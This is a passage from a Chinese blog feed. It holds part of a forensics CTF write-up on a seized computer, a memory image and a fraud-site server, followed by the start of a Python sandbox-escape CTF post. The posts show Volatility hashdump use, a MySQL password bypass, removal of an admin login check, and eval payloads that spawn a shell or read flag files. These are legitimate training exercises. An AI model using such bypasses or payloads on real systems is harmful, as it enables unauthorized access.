title="16.请给出嫌疑人计算机内文件名为“C盘清理.bat”的SHA-1？[答案格式：字母小写]"></a>16.请给出嫌疑人计算机内文件名为“C盘清理.bat”的SHA-1？[答案格式：字母小写]</h3><p>先将这个文件 从虚拟机中提取出来 </p><p>直接放在火眼中进行分析 找到<code>C盘清理.bat</code> 直接计算哈希 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309192220013.png" alt="image-20230919222021755"></p><pre><code>24CFCFDF1FA894244F904067838E7E01E28FF450</code></pre><h3 id="17-请给出嫌疑人Vera-Crypt加密容器的解密密码？-答案格式：admin"><a href="#17-请给出嫌疑人Vera-Crypt加密容器的解密密码？-答案格式：admin" class="headerlink" title="17.请给出嫌疑人Vera Crypt加密容器的解密密码？[答案格式：admin!@#]"></a>17.请给出嫌疑人Vera Crypt加密容器的解密密码？[答案格式：admin!@#]</h3><p>取证大师  直接全剧搜索密码  可以找到一个<code>密码.txt</code><br><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309192233993.png" alt="image-20230919223305940"></p><h3 id="18-请给出嫌疑人电脑内iSCSI服务器对外端口号？-答案格式：8080"><a href="#18-请给出嫌疑人电脑内iSCSI服务器对外端口号？-答案格式：8080" class="headerlink" title="18.请给出嫌疑人电脑内iSCSI服务器对外端口号？[答案格式：8080]"></a>18.请给出嫌疑人电脑内iSCSI服务器对外端口号？[答案格式：8080]</h3><p>之后看wp才明白 仿真起的计算机中有一个<code>starwind</code> 软件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309192253879.png" alt="image-20230919225344826"></p><p>与服务器的端口号有关系 找到这个软件并运行 就可以看到端口号</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309192255001.png" alt="image-20230919225501908"></p><pre><code>3261</code></pre><h3 id="19-请给出嫌疑人电脑内iSCSI服务器CHAP认证的账号密码？-答案格式：root-x2F-admin"><a href="#19-请给出嫌疑人电脑内iSCSI服务器CHAP认证的账号密码？-答案格式：root-x2F-admin" class="headerlink" title="19.请给出嫌疑人电脑内iSCSI服务器CHAP认证的账号密码？[答案格式：root&#x2F;admin]"></a>19.请给出嫌疑人电脑内iSCSI服务器CHAP认证的账号密码？[答案格式：root&#x2F;admin]</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309192307014.png" alt="image-20230919230706961"></p><p>从软件中看出 CHAP认证的账户名是<code>user</code> 导出starwind的文件夹 直接全局搜索账户名 找到密码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309192306919.png" alt="image-20230919230645883"></p><pre><code>panguite.com</code></pre><h3 id="20-分析嫌疑人电脑内提现记录表，用户“mi51888”提现总额为多少？-答案格式：10000"><a href="#20-分析嫌疑人电脑内提现记录表，用户“mi51888”提现总额为多少？-答案格式：10000" class="headerlink" title="20.分析嫌疑人电脑内提现记录表，用户“mi51888”提现总额为多少？[答案格式：10000]"></a>20.分析嫌疑人电脑内提现记录表，用户“mi51888”提现总额为多少？[答案格式：10000]</h3><p>17题找到了 vc容器密码 接下来找一下vc容器 发现<code>20134133datqwer.txt</code>的大小是2gb 很可能是vc容器</p><p>尝试进行挂载</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309192325958.png" alt="image-20230919232540905"></p><p>挂载出很多excel表格 找到提现记录表格 在里面筛选出<code>mi518888</code>的提现记录 在求和即可</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309192327457.png" alt="image-20230919232701378"></p><pre><code>1019</code></pre><h2 id="内存"><a href="#内存" class="headerlink" title="内存"></a>内存</h2><h3 id="21-请给出计算机内存创建北京时间？-答案格式：2000-01-11-00-00-00"><a href="#21-请给出计算机内存创建北京时间？-答案格式：2000-01-11-00-00-00" class="headerlink" title="21.请给出计算机内存创建北京时间？[答案格式：2000-01-11 00:00:00]"></a>21.请给出计算机内存创建北京时间？[答案格式：2000-01-11 00:00:00]</h3><pre><code class="bash">.\volatility.exe -f .\memdump.mem imageinfo</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309242131429.png" alt="image-20230915141725330"></p><pre><code>2023-06-21 01:02:27</code></pre><h3 id="22-请给出计算机内用户yang88的开机密码？-答案格式：abc-123"><a href="#22-请给出计算机内用户yang88的开机密码？-答案格式：abc-123" class="headerlink" title="22.请给出计算机内用户yang88的开机密码？[答案格式：abc.123]"></a>22.请给出计算机内用户yang88的开机密码？[答案格式：abc.123]</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309242131430.png" alt="image-20230915142218823"></p><pre><code>3w.qax.com</code></pre><h3 id="23-提取内存镜像中的USB设备信息，给出该USB设备的最后连接北京时间？-答案格式：2000-01-11-00-00-00"><a href="#23-提取内存镜像中的USB设备信息，给出该USB设备的最后连接北京时间？-答案格式：2000-01-11-00-00-00" class="headerlink" title="23.提取内存镜像中的USB设备信息，给出该USB设备的最后连接北京时间？[答案格式：2000-01-11 00:00:00]"></a>23.提取内存镜像中的USB设备信息，给出该USB设备的最后连接北京时间？[答案格式：2000-01-11 00:00:00]</h3><p>两种方法</p><h4 id="法一：直接取证软件梭"><a href="#法一：直接取证软件梭" class="headerlink" title="法一：直接取证软件梭"></a>法一：直接取证软件梭</h4><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309242131431.png" alt="image-20230915143329000"></p><p>但是这里需要注意 内存镜像制作完的时间是<code>2023-06-21 01:02:27</code> 因此对于内存镜像来说 usb插拔的时间不能超过这个内存镜像制作好的时间</p><p>所以 usb最后连接的北京时间是</p><pre><code>2023-06-21 01:01:25</code></pre><h4 id="法二：vol进行查取"><a href="#法二：vol进行查取" class="headerlink" title="法二：vol进行查取"></a>法二：vol进行查取</h4><pre><code class="bash">.\volatility.exe -f .\memdump.mem --profile=Win7SP1x64  printkey -K &quot;ControlSet001\Enum\USBSTOR&quot;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309242131432.png" alt="image-20230915143942225"></p><p>但是这里需要注意 <code>UTC</code> 是世界统一时间 而北京时间是<code>UTC +0800</code> 这里的时间表示法是<code>UTC +0000</code> 所以北京时间要在查取到的时间的基础上加8h 也就是 </p><pre><code>2023-06-21 01:01:25</code></pre><h3 id="24-请给出用户yang88的LMHASH值？"><a href="#24-请给出用户yang88的LMHASH值？" class="headerlink" title="24.请给出用户yang88的LMHASH值？"></a>24.请给出用户yang88的LMHASH值？</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309242131433.png" alt="image-20230915144924733"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309242131434.png" alt="image-20230915144938875"></p><pre><code>aad3b435b51404eeaad3b435b51404ee</code></pre><h3 id="25-请给出用户yang88访问过文件“提现记录-xlsx”的北京时间？-答案格式：2000-01-11-00-00-00"><a href="#25-请给出用户yang88访问过文件“提现记录-xlsx”的北京时间？-答案格式：2000-01-11-00-00-00" class="headerlink" title="25.请给出用户yang88访问过文件“提现记录.xlsx”的北京时间？[答案格式：2000-01-11 00:00:00]"></a>25.请给出用户yang88访问过文件“提现记录.xlsx”的北京时间？[答案格式：2000-01-11 00:00:00]</h3><pre><code class="bash">.\volatility.exe -f .\memdump.mem --profile=Win7SP1x64  hashdump</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230826115350136.png" alt="image-20230826115350136"></p><pre><code>2023-06-21 00:29:16</code></pre><h3 id="26-请给出“VeraCrypt”最后一次执行的北京时间？-答案格式：2000-01-11-00-00-00"><a href="#26-请给出“VeraCrypt”最后一次执行的北京时间？-答案格式：2000-01-11-00-00-00" class="headerlink" title="26.请给出“VeraCrypt”最后一次执行的北京时间？[答案格式：2000-01-11 00:00:00]"></a>26.请给出“VeraCrypt”最后一次执行的北京时间？[答案格式：2000-01-11 00:00:00]</h3><pre><code class="bash">.\volatility.exe -f .\memdump.mem --profile=Win7SP1x64  pslist | findstr &quot;Vera&quot;# 列出该内存的所有进程信息或.\volatility.exe -f .\memdump.mem --profile=Win7SP1x64 userassist# 提取出内存中记录的 当时正在运行的程序有哪些，运行过多少次，最后一次运行的时间等信息</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309242131435.png" alt="image-20230915145823193"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309242131436.png" alt="image-20230915150248535"></p><p>同样 因为是北京时间 所以要加8h</p><pre><code>2023-06-21 00:47:41</code></pre><h3 id="27-分析内存镜像，请给出用户在“2023-06-20-16-56-57-UTC-0”访问过“维斯塔斯”后台多少次？-答案格式-10"><a href="#27-分析内存镜像，请给出用户在“2023-06-20-16-56-57-UTC-0”访问过“维斯塔斯”后台多少次？-答案格式-10" class="headerlink" title="27.分析内存镜像，请给出用户在“2023-06-20 16:56:57 UTC+0”访问过“维斯塔斯”后台多少次？[答案格式:10]"></a>27.分析内存镜像，请给出用户在“2023-06-20 16:56:57 UTC+0”访问过“维斯塔斯”后台多少次？[答案格式:10]</h3><p>使用AXIOM对内存镜像进行分析</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230826131337118.png" alt="image-20230826131337118"></p><p>可以发现是访问了后台url两次</p><pre><code>2</code></pre><h3 id="28-请给出用户最后一次访问chrome浏览器的进程PID？-答案格式：1234"><a href="#28-请给出用户最后一次访问chrome浏览器的进程PID？-答案格式：1234" class="headerlink" title="28.请给出用户最后一次访问chrome浏览器的进程PID？[答案格式：1234]"></a>28.请给出用户最后一次访问chrome浏览器的进程PID？[答案格式：1234]</h3><pre><code class="bash">.\volatility.exe -f .\memdump.mem --profile=Win7SP1x64  pslist | findstr &quot;chrome&quot;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309242131437.png" alt="image-20230915152827252"></p><p>看时间 最后一次访问的PID是</p><pre><code>2456</code></pre><h2 id="服务器"><a href="#服务器" class="headerlink" title="服务器"></a>服务器</h2><h3 id="29-分析涉案服务器，请给出涉案服务器的内核版本？-答案格式：xx-xxx-xxx-xx-xx"><a href="#29-分析涉案服务器，请给出涉案服务器的内核版本？-答案格式：xx-xxx-xxx-xx-xx" class="headerlink" title="29.分析涉案服务器，请给出涉案服务器的内核版本？[答案格式：xx.xxx-xxx.xx.xx]"></a>29.分析涉案服务器，请给出涉案服务器的内核版本？[答案格式：xx.xxx-xxx.xx.xx]</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309242131438.png" alt="image-20230920231522483"></p><pre><code>3.10.0-957.el7.x86_64</code></pre><h3 id="30-分析涉案服务器，请给出MySQL数据库的root账号密码？-答案格式：Admin123"><a href="#30-分析涉案服务器，请给出MySQL数据库的root账号密码？-答案格式：Admin123" class="headerlink" title="30.分析涉案服务器，请给出MySQL数据库的root账号密码？[答案格式：Admin123]"></a>30.分析涉案服务器，请给出MySQL数据库的root账号密码？[答案格式：Admin123]</h3><p>仿真起服务器 连上xshell 先看一下有无宝塔</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309221130479.png" alt="image-20230922113038389"></p><p>有 改下密码 等宝塔看看</p><p>在<code>/www/wwwroot/v9.licai.com/config</code> 下找到一个<code>database.php</code>  其中的所有数据库信息都是用env这个函数表示的 在宝塔文件夹中找一找有关env的文件 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309221132760.png" alt="image-20230922113203692"></p><p>在<code>/www/wwwroot/v9.licai.com</code>下有个<code>.env</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309221136628.png" alt="image-20230922113616597"></p><p>找到密码</p><pre><code>ff1d923939ca2dcf</code></pre><h3 id="31-分析涉案服务器，请给出涉案网站RDS数据库地址？-答题格式-xx-xx-xx-xx-xx-xx"><a href="#31-分析涉案服务器，请给出涉案网站RDS数据库地址？-答题格式-xx-xx-xx-xx-xx-xx" class="headerlink" title="31.分析涉案服务器，请给出涉案网站RDS数据库地址？[答题格式: xx-xx.xx.xx.xx.xx]"></a>31.分析涉案服务器，请给出涉案网站RDS数据库地址？[答题格式: xx-xx.xx.xx.xx.xx]</h3><p>RDS数据库其实就是阿里云的数据库</p><pre><code>阿里云关系型数据库RDS（Relational Database Service）是一种可弹性伸缩的在线数据库服务，基于阿里云分布式文件系统和SSD盘高性能存储，采用双机热备，数据多副本冗余及自动备份机制。RDS支持MySQL、SQL Server、PostgreSQL、PPAS（Postgre Plus Advanced Server，高度兼容Oracle数据库）和MariaDB TX引擎，并且提供了容灾、备份、恢复、监控、迁移等方面的全套解决方案。</code></pre><p>所以答案就在 上一题找到的有关数据库的信息中</p><pre><code>pc-uf6mmj68r91f78hkj.rwlb.rds.aliyuncs.com</code></pre><h3 id="32-请给出涉网网站数据库版本号-答题格式-5-6-00"><a href="#32-请给出涉网网站数据库版本号-答题格式-5-6-00" class="headerlink" title="32.请给出涉网网站数据库版本号? [答题格式: 5.6.00]"></a>32.请给出涉网网站数据库版本号? [答题格式: 5.6.00]</h3><p>在<code>/www/server</code>下 有很多有关数据库的文件夹 在里面找到mysql的 在<code>version.pl</code>中 找到版本</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309221150824.png" alt="image-20230922115027774"></p><pre><code>5.7.40</code></pre><p>或者直接命令行</p><pre><code>mysql -Version</code></pre><h3 id="33-请给出嫌疑人累计推广人数？-答案格式：100"><a href="#33-请给出嫌疑人累计推广人数？-答案格式：100" class="headerlink" title="33.请给出嫌疑人累计推广人数？[答案格式：100]"></a>33.请给出嫌疑人累计推广人数？[答案格式：100]</h3><p>大体思路是使用火眼的数据库工具还原数据库 建立本地连接——使用navicat将viplicai数据库保存为sql格式数据库——仿真服务器——navicat使用ssh连接服务器——将还原出的数据库部署到服务器上——在宝塔中建立域名规则访问网站</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309232000939.png" alt="image-20230923195955857"></p><p>将给出的xb后缀阿里云数据库文件放到火眼的数据库分析工具中 成功还原出数据库信息 找到重构网站所需的viplicai数据库 进行解析 建立本地连接</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309232002524.png" alt="image-20230923200230469"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309232003512.png" alt="image-20230923200329467"></p><p>得到建立了本地连接的端口 用户名 密码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309232005051.png" alt="image-20230923200527014"></p><p>成功使用navicat建立本地连接 再将viplicai数据库 转储为sql文件<code>viplicai.sql</code> </p><p>这里学到一个点 <font color='red'>mysql数据库绕过密码</font></p><p><a href="https://blog.csdn.net/weixin_44156366/article/details/104960518?ops_request_misc=&request_id=&biz_id=102&utm_term=linux%E7%BB%95%E8%BF%87mysql8%E5%AF%86%E7%A0%81&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-3-104960518.142%5Ev94%5Einsert_down28v1&spm=1018.2226.3001.4187">linux mysql8免密登录</a></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309232038028.png" alt="image-20230923203822975"></p><pre><code>vim /etc/my.cnf</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309232039189.png" alt="image-20230923203944160"></p><p>再加上一个小点 因为我们后面需要ssh连上服务器 再将刚刚保存的viplicai.sql文件 迁移到服务器中 在这个服务器中 又是mysql8的高版本 需要注意在数据迁移过程中的大小写敏感问题</p><p>因此 在<code>my.cnf</code>文件配置中再加上一条</p><pre><code>lower_case_table_names = 1</code></pre><p><a href="https://blog.csdn.net/qq_42768234/article/details/125002150?ops_request_misc=&request_id=&biz_id=102&utm_term=lower_case_table_names=1%E7%9A%84%E4%BD%9C%E7%94%A8&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-2-125002150.142%5Ev94%5Einsert_down28v1&spm=1018.2226.3001.4187">MySQL 数据迁移中 lower_case_table_names 参数影响</a></p><p>接下来 navicat中使用ssh连接服务器 在将运行sql文件 将viplicai.sql转移到服务器上</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309232110127.png" alt="image-20230923211014078"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309232110375.png" alt="image-20230923211030336"></p><p>在登陆mysql服务 就可以看到vip.licai.com数据库了</p><p>再次修改<code>.env</code>的内容 将网站使用的数据库改成我们添加的vip.licai.com数据库  host改为localhost</p><p>在分析计算机时 在嫌疑人浏览器的历史记录中 找到了目标网站的后台登陆网址(其实在内存镜像中也有)</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309232121519.png" alt="image-20230923212116486"></p><p>在宝塔中新建一个域名规则 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309232148965.png" alt="image-20230923214827915"></p><p>访问成功</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309232149974.png" alt="image-20230923214911758"></p><p>但是密码是处于加密状态 找到登陆的源码 </p><pre><code>/www/wwwroot/v9.licai.com/app/Http/Controllers/Admin/LoginController.php</code></pre><p>直接将验证密码这一部分的源码注释掉 改成任意密码登陆</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309232215630.png" alt="image-20230923221500578"></p><p>但还会有一个登陆时间的限制</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309232216114.png" alt="image-20230923221640050"></p><p>直接将这一部分代码 删掉就好</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309232217878.png" alt="image-20230923221726830"></p><p>成功登陆</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309232218501.png" alt="image-20230923221849390"></p><p>直接搜yang88(嫌疑人)</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309241959064.png" alt="image-20230924195955022"></p><pre><code>69</code></pre><h3 id="34-请给出涉案网站后台启用的超级管理员-答题格式-abc"><a href="#34-请给出涉案网站后台启用的超级管理员-答题格式-abc" class="headerlink" title="34.请给出涉案网站后台启用的超级管理员?[答题格式:abc]"></a>34.请给出涉案网站后台启用的超级管理员?[答题格式:abc]</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309241811392.png" alt="image-20230924181112325"></p><pre><code>admin</code></pre><h3 id="35-投资项目“贵州六盘水市风力发电基建工程”的日化收益为？-答题格式-1-00"><a href="#35-投资项目“贵州六盘水市风力发电基建工程”的日化收益为？-答题格式-1-00" class="headerlink" title="35.投资项目“贵州六盘水市风力发电基建工程”的日化收益为？[答题格式:1.00%]"></a>35.投资项目“贵州六盘水市风力发电基建工程”的日化收益为？[答题格式:1.00%]</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309241931074.png" alt="image-20230924193137000"></p><pre><code>4.00%</code></pre><h3 id="36-最早访问涉案网站后台的IP地址为-答题格式-8-8-8-8"><a href="#36-最早访问涉案网站后台的IP地址为-答题格式-8-8-8-8" class="headerlink" title="36.最早访问涉案网站后台的IP地址为[答题格式:8.8.8.8]"></a>36.最早访问涉案网站后台的IP地址为[答题格式:8.8.8.8]</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309241934678.png" alt="image-20230924193441618"></p><pre><code>183.160.76.194</code></pre><h3 id="37-分析涉案网站数据库或者后台VIP2的会员有多少个-答案格式-100"><a href="#37-分析涉案网站数据库或者后台VIP2的会员有多少个-答案格式-100" class="headerlink" title="37.分析涉案网站数据库或者后台VIP2的会员有多少个[答案格式:100]"></a>37.分析涉案网站数据库或者后台VIP2的会员有多少个[答案格式:100]</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309241942450.png" alt="image-20230924194259413"></p><p>由图可知 VIP2的会员等级是3</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309241944250.png" alt="image-20230924194438213"></p><p>一共是20个</p><h3 id="38-分析涉案网站数据库的用户表中账户余额大于零且银行卡开户行归属于上海市的潜在受害人的数量为-答题格式-8"><a href="#38-分析涉案网站数据库的用户表中账户余额大于零且银行卡开户行归属于上海市的潜在受害人的数量为-答题格式-8" class="headerlink" title="38.分析涉案网站数据库的用户表中账户余额大于零且银行卡开户行归属于上海市的潜在受害人的数量为[答题格式:8]"></a>38.分析涉案网站数据库的用户表中账户余额大于零且银行卡开户行归属于上海市的潜在受害人的数量为[答题格式:8]</h3><p>搜索上海  找到两个人 在查看具体信息 账户中的余额都大于0</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309241947837.png" alt="image-20230924194743782"></p><pre><code>2</code></pre><h3 id="39-分析涉案网站数据库或者后台，统计嫌疑人的下线成功提现多少钱？-答题格式-10000-00"><a href="#39-分析涉案网站数据库或者后台，统计嫌疑人的下线成功提现多少钱？-答题格式-10000-00" class="headerlink" title="39.分析涉案网站数据库或者后台，统计嫌疑人的下线成功提现多少钱？[答题格式:10000.00]"></a>39.分析涉案网站数据库或者后台，统计嫌疑人的下线成功提现多少钱？[答题格式:10000.00]</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309242000264.png" alt="image-20230924200016232"></p><pre><code>128457.00</code></pre><h3 id="40-分析涉案网站数据库或者后台受害人上线在平台内共有下线多少人？-答题格式-123"><a href="#40-分析涉案网站数据库或者后台受害人上线在平台内共有下线多少人？-答题格式-123" class="headerlink" title="40.分析涉案网站数据库或者后台受害人上线在平台内共有下线多少人？[答题格式:123]"></a>40.分析涉案网站数据库或者后台受害人上线在平台内共有下线多少人？[答题格式:123]</h3><p>由案情可知 上线就是嫌疑人yang88 其邀请码是513935</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309242002674.png" alt="image-20230924200244616"></p><p>将成员表导出 对邀请码进行排序 选出邀请码为<code>513935</code>的人员 一共17个</p><pre><code>17</code></pre><h3 id="41-分析涉案网站数据库或者后台网站内下线大于2的代理有多少个？-答题格式-10"><a href="#41-分析涉案网站数据库或者后台网站内下线大于2的代理有多少个？-答题格式-10" class="headerlink" title="41.分析涉案网站数据库或者后台网站内下线大于2的代理有多少个？[答题格式:10]"></a>41.分析涉案网站数据库或者后台网站内下线大于2的代理有多少个？[答题格式:10]</h3><p>在member.xlsx中邀请码那一列导出 先算出重复出现的次数 </p><p>要用到countif函数</p><p><a href="https://blog.csdn.net/en_joker/article/details/106634116?ops_request_misc=&request_id=&biz_id=102&utm_term=%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8excel%E8%AE%A1%E6%95%B0%20%E8%BF%94%E5%9B%9E%E6%AF%8F%E4%B8%AA%E6%95%B0%E5%AD%97%E5%87%BA%E7%8E%B0%E7%9A%84%E6%AC%A1%E6%95%B0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-5-106634116.142%5Ev94%5Einsert_down28v1&spm=1018.2226.3001.4449">excel算出重复次数</a></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309242055498.png" alt="image-20230924205535455"></p><p>在对次数这一列 进行排序 可以看到次数大于3的邀请码一共有60个</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309242056284.png" alt="image-20230924205628233"></p><p>所以满足条件的代理一共有60个</p><h3 id="42-分析涉案网站数据库或者后台网站内下线最多的代理真实名字为-答题格式-张三"><a href="#42-分析涉案网站数据库或者后台网站内下线最多的代理真实名字为-答题格式-张三" class="headerlink" title="42.分析涉案网站数据库或者后台网站内下线最多的代理真实名字为[答题格式:张三]"></a>42.分析涉案网站数据库或者后台网站内下线最多的代理真实名字为[答题格式:张三]</h3><p>接上一题 由上表可以知道使用次数最多的邀请码是617624 也就是说下线最多的代理的邀请码是617624 直接在数据库中搜索 找到对应代理</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309242100346.png" alt="image-20230924210022304"></p><pre><code>骆潇原</code></pre><h3 id="43-分析涉案网站数据库或者后台流水明细，本网站总共盈利多少钱-答题格式-10-000-00"><a href="#43-分析涉案网站数据库或者后台流水明细，本网站总共盈利多少钱-答题格式-10-000-00" class="headerlink" title="43.分析涉案网站数据库或者后台流水明细，本网站总共盈利多少钱[答题格式:10,000.00]"></a>43.分析涉案网站数据库或者后台流水明细，本网站总共盈利多少钱[答题格式:10,000.00]</h3><p>使用sql语句直接在数据库中进行查询</p><pre><code>select (SELECT sum(moneylog_money) FROM moneylog WHERE moneylog_status=&#39;+&#39;)-(SELECT sum(moneylog_money) FROM moneylog WHERE moneylog_status=&#39;-&#39;)</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309242126385.png" alt="image-20230924212640350"></p><pre><code>15078796.38</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2023年蓝帽杯初赛取证wp&quot;&gt;&lt;a href=&quot;#2023年蓝帽杯初赛取证wp&quot; class=&quot;headerlink&quot; title=&quot;2023年蓝帽杯初赛取证wp&quot;&gt;&lt;/a&gt;2023年蓝帽杯初赛取证wp&lt;/h1&gt;&lt;h2 id=&quot;手机&quot;&gt;&lt;a href=&quot;#手机&quot;</summary>
      
    
    
    
    <category term="取证" scheme="http://w3nx1z1.github.io/categories/%E5%8F%96%E8%AF%81/"/>
    
    
  </entry>
  
  <entry>
    <title>初识沙箱逃逸</title>
    <link href="http://w3nx1z1.github.io/2023/08/05/%E5%88%9D%E8%AF%86%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
    <id>http://w3nx1z1.github.io/2023/08/05/%E5%88%9D%E8%AF%86%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</id>
    <published>2023-08-05T14:14:56.171Z</published>
    <updated>2023-08-06T03:50:10.940Z</updated>
    
    <content type="html"><![CDATA[<h1 id="初识沙箱逃逸"><a href="#初识沙箱逃逸" class="headerlink" title="初识沙箱逃逸"></a>初识沙箱逃逸</h1><h2 id="HNCTF-2022-Week1-calc-jail-beginner-level-JAIL-沙箱逃逸"><a href="#HNCTF-2022-Week1-calc-jail-beginner-level-JAIL-沙箱逃逸" class="headerlink" title="[HNCTF 2022 Week1]calc_jail_beginner_level(JAIL 沙箱逃逸)"></a>[HNCTF 2022 Week1]calc_jail_beginner_level(JAIL 沙箱逃逸)</h2><p>给了源码</p><pre><code class="python">#Your goal is to read ./flag.txt#You can use these payload liked `__import__(&#39;os&#39;).system(&#39;cat ./flag.txt&#39;)` or `print(open(&#39;/flag.txt&#39;).read())`WELCOME = &#39;&#39;&#39;  _     ______      _                              _       _ _  | |   |  ____|    (_)                            | |     (_) | | |__ | |__   __ _ _ _ __  _ __   ___ _ __       | | __ _ _| | | &#39;_ \|  __| / _` | | &#39;_ \| &#39;_ \ / _ \ &#39;__|  _   | |/ _` | | | | |_) | |___| (_| | | | | | | | |  __/ |    | |__| | (_| | | | |_.__/|______\__, |_|_| |_|_| |_|\___|_|     \____/ \__,_|_|_|               __/ |                                                         |___/                                            &#39;&#39;&#39;print(WELCOME)print(&quot;Welcome to the python jail&quot;)print(&quot;Let&#39;s have an beginner jail of calc&quot;)print(&quot;Enter your expression and I will evaluate it for you.&quot;)input_data = input(&quot;&gt; &quot;)print(&#39;Answer: &#123;&#125;&#39;.format(eval(input_data)))</code></pre><p>什么也没有过滤 并且给了提示 可以使用上面两种payload  </p><p>这里尝试使用交互式操作 </p><pre><code>__import__(&#39;os&#39;).system(&#39;sh&#39;)</code></pre><p>解释一下</p><pre><code>__import__(&#39;os&#39;)：这是一个使用内置函数 __import__ 来导入 Python 模块 os 的代码。os 模块提供了与操作系统交互的功能，例如执行系统命令、文件操作等。os.system(&#39;sh&#39;)：在导入了 os 模块后，该代码执行了 os.system(&#39;sh&#39;)。os.system() 函数是用于执行系统命令的，它接受一个字符串参数，将其中的命令在终端或命令提示符中执行。在这里，它试图执行命令 sh。sh 是一个常用的 Unix/Linux 命令行解释器（shell），它是命令行的一个交互式解释器，允许用户输入命令并执行。</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230730220144872.png" alt="image-20230730220144872"></p><h2 id="HNCTF-2022-Week1-calc-jail-beginner-level1-JAIL-沙箱逃逸-chr-SSTI注入"><a href="#HNCTF-2022-Week1-calc-jail-beginner-level1-JAIL-沙箱逃逸-chr-SSTI注入" class="headerlink" title="[HNCTF 2022 Week1]calc_jail_beginner_level1(JAIL 沙箱逃逸 chr() SSTI注入)"></a>[HNCTF 2022 Week1]calc_jail_beginner_level1(JAIL 沙箱逃逸 chr() SSTI注入)</h2><p>也是给出了源码 但是在其中绕过了单引号、双引号、反斜杠、反引号和i、b两个字母</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230730220420343.png" alt="image-20230730220420343"></p><h3 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h3><p>下面使用一种方法：<code>python模板注入</code> 简称<code>SSTI</code></p><p>python中的元组、列表、字典、字符串等都是对象 可以用过<code>__class__</code>这个函数来进行查看  可以看到父类是<code>object</code> 可以说任何类的父类都是<code>object</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230731163225243.png" alt="image-20230731163225243"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230731163235565.png" alt="image-20230731163235565"></p><p><code>__base__</code>是返回这个对象所属类的父类 